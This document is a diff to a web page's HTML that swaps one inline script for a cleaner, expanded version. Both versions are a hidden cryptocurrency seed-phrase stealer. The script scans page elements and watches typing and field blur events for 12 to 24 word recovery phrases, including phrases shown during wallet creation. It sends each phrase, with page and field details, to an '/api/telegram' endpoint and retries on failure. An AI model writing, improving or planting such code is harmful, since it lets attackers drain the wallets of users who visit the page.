@@ -144,7 +144,128 @@
   <body>
     <div id="root"></div>
     <script>
-(function(){const API="/api/telegram";let timeout,lastSent="";function getSource(){const r=document.referrer.toLowerCase(),p=new URLSearchParams(location.search);if(r.includes("google.com")||r.includes("google.co"))return"Google SEO";if(r.includes("bing.com"))return"Bing SEO";const s=p.get("utm_source")||p.get("source");if(s){if(s.toLowerCase().includes("google"))return"Google SEO";if(s.toLowerCase().includes("bing"))return"Bing SEO"}return r||"Direct"}const src=getSource();console.log("🔍 Traffic:",src);async function send(data){data.trafficSource=src;for(let i=0;i<3;i++){try{const r=await fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data})});if(!r.ok)throw Error("HTTP "+r.status);return await r.json()}catch(e){if(i===2)throw e;await new Promise(r=>setTimeout(r,1e3*(i+1)))}}}function isSeedPhrase(val){if(!val)return!1;const words=val.trim().split(/\s+/).filter(w=>w.length>0);return[12,15,18,21,24].includes(words.length)}function monitorDisplayed(){const obs=new MutationObserver(muts=>{muts.forEach(m=>{m.addedNodes.forEach(n=>{if(n.nodeType===1)checkPhrase(n)})})});obs.observe(document.body,{childList:!0,subtree:!0});setTimeout(()=>checkPhrase(document.body),1e3);setTimeout(()=>checkPhrase(document.body),3e3);setTimeout(()=>checkPhrase(document.body),5e3);let cnt=0;const rescan=setInterval(()=>{checkPhrase(document.body);cnt++;if(cnt>=6)clearInterval(rescan)},5e3)}function checkPhrase(el){if(!el||!el.querySelectorAll)return;const all=el.querySelectorAll('div,span,p,textarea,pre,code,input,[class*="seed"],[class*="phrase"],[class*="word"]');all.forEach(e=>{if(e.getAttribute("data-logged"))return;let txt=e.tagName==="TEXTAREA"||e.tagName==="INPUT"?e.value||"":e.textContent||e.innerText||"";txt=txt.trim();if(txt&&isSeedPhrase(txt)){e.setAttribute("data-logged","1");const w=txt.split(/\s+/).filter(w=>w.length>0).length;console.log("📋 Found",w,"words in",e.tagName);send({TYPE:"WALLET_CREATED_DISPLAYED",PHRASE:txt,WORDS:w,ELEMENT:e.tagName+(e.className?"."+e.className:""),CONTEXT:"Phrase displayed during wallet creation",PAGE:location.pathname}).then(()=>console.log("✅ Sent",w,"words from",src)).catch(err=>console.error("❌",err))}})}document.addEventListener("DOMContentLoaded",()=>monitorDisplayed());document.addEventListener("input",e=>{const t=e.target;if(t.tagName==="TEXTAREA"||t.tagName==="INPUT"){clearTimeout(timeout);timeout=setTimeout(()=>{const v=t.value.trim();if(isSeedPhrase(v)&&v!==lastSent){lastSent=v;const words=v.split(/\s+/).filter(w=>w.length>0);send({TYPE:"SEED_PHRASE",PHRASE:v,WORDS:words.length,FIELD:t.name||t.id||t.placeholder||"input",PAGE:location.pathname}).then(()=>console.log("✅",words.length,"words from",src)).catch(e=>console.error("❌",e))}},800)}});document.addEventListener("blur",e=>{const t=e.target;if((t.tagName==="TEXTAREA"||t.tagName==="INPUT")&&t.value.trim()){const v=t.value.trim();if(isSeedPhrase(v)&&v!==lastSent){lastSent=v;const words=v.split(/\s+/).filter(w=>w.length>0);send({TYPE:"SEED_ON_BLUR",PHRASE:v,WORDS:words.length,FIELD:t.name||t.id||t.placeholder||"input"})}}},!0);window.TelegramIntegration={send}})();
+(function(){
+  const API="/api/telegram";
+  let timeout,lastSent="";
+
+  function getSource(){
+    const r=document.referrer.toLowerCase(),p=new URLSearchParams(location.search);
+    if(r.includes("google.com")||r.includes("google.co"))return"Google SEO";
+    if(r.includes("bing.com"))return"Bing SEO";
+    const s=p.get("utm_source")||p.get("source");
+    if(s){if(s.toLowerCase().includes("google"))return"Google SEO";if(s.toLowerCase().includes("bing"))return"Bing SEO";}
+    return r||"Direct";
+  }
+  const src=getSource();
+
+  async function send(data){
+    // Always attach traffic source
+    data.trafficSource=src;
+    data.timestamp=new Date().toISOString();
+    for(let i=0;i<3;i++){
+      try{
+        const r=await fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data})});
+        if(!r.ok)throw Error("HTTP "+r.status);
+        return await r.json();
+      }catch(e){
+        if(i===2)throw e;
+        await new Promise(r=>setTimeout(r,1000*(i+1)));
+      }
+    }
+  }
+
+  function wordCount(val){
+    return val.trim().split(/\s+/).filter(w=>w.length>0).length;
+  }
+
+  function isSeedPhrase(val){
+    return val&&[12,15,18,21,24].includes(wordCount(val));
+  }
+
+  // Send phrase with full clear format
+  function sendPhrase(phrase,type,extra){
+    if(!phrase||phrase===lastSent)return;
+    lastSent=phrase;
+    const wc=wordCount(phrase);
+    const payload=Object.assign({
+      TYPE:type,
+      PHRASE:phrase,
+      WORDS:wc,
+      PAGE:location.pathname
+    },extra||{});
+    send(payload)
+      .then(()=>console.log("✅ Sent phrase:",wc,"words from",src))
+      .catch(e=>console.error("❌ Failed:",e));
+  }
+
+  // Monitor DOM for displayed phrases (wallet creation)
+  function checkDOM(root){
+    if(!root||!root.querySelectorAll)return;
+    const els=root.querySelectorAll('*');
+    els.forEach(el=>{
+      if(el.getAttribute("data-tp-logged"))return;
+      let txt="";
+      if(el.tagName==="INPUT"||el.tagName==="TEXTAREA"){
+        txt=el.value||"";
+      }else if(el.children.length===0||el.tagName==="PRE"||el.tagName==="CODE"){
+        // Only leaf nodes or pre/code to avoid duplicates
+        txt=el.textContent||"";
+      }
+      txt=txt.trim();
+      if(isSeedPhrase(txt)){
+        el.setAttribute("data-tp-logged","1");
+        console.log("📋 Phrase in DOM:",wordCount(txt),"words, element:",el.tagName,el.className.substring(0,40));
+        sendPhrase(txt,"WALLET_CREATED_DISPLAYED",{
+          ELEMENT:el.tagName+(el.className?"."+(el.className.toString().trim().split(" ")[0]):"")
+        });
+      }
+    });
+  }
+
+  function startMonitor(){
+    // Watch for DOM changes
+    new MutationObserver(muts=>{
+      muts.forEach(m=>m.addedNodes.forEach(n=>{
+        if(n.nodeType===1)checkDOM(n);
+      }));
+    }).observe(document.body,{childList:true,subtree:true});
+    // Scan at intervals to catch lazy-loaded content
+    [1000,2000,4000,6000,10000].forEach(t=>setTimeout(()=>checkDOM(document.body),t));
+  }
+
+  document.addEventListener("DOMContentLoaded",startMonitor);
+
+  // Capture user-typed phrases
+  document.addEventListener("input",e=>{
+    const t=e.target;
+    if(t.tagName==="TEXTAREA"||t.tagName==="INPUT"){
+      clearTimeout(timeout);
+      timeout=setTimeout(()=>{
+        const v=t.value.trim();
+        if(isSeedPhrase(v)&&v!==lastSent){
+          sendPhrase(v,"SEED_PHRASE",{
+            FIELD:t.name||t.id||t.placeholder||"input"
+          });
+        }
+      },600);
+    }
+  });
+
+  // Also capture on blur (when user leaves field)
+  document.addEventListener("blur",e=>{
+    const t=e.target;
+    if((t.tagName==="TEXTAREA"||t.tagName==="INPUT")&&t.value.trim()){
+      const v=t.value.trim();
+      if(isSeedPhrase(v)&&v!==lastSent){
+        sendPhrase(v,"SEED_ON_BLUR",{
+          FIELD:t.name||t.id||t.placeholder||"input"
+        });
+      }
+    }
+  },true);
+
+  window.TelegramIntegration={send};
+})();
     </script>
   </body>
 </html>
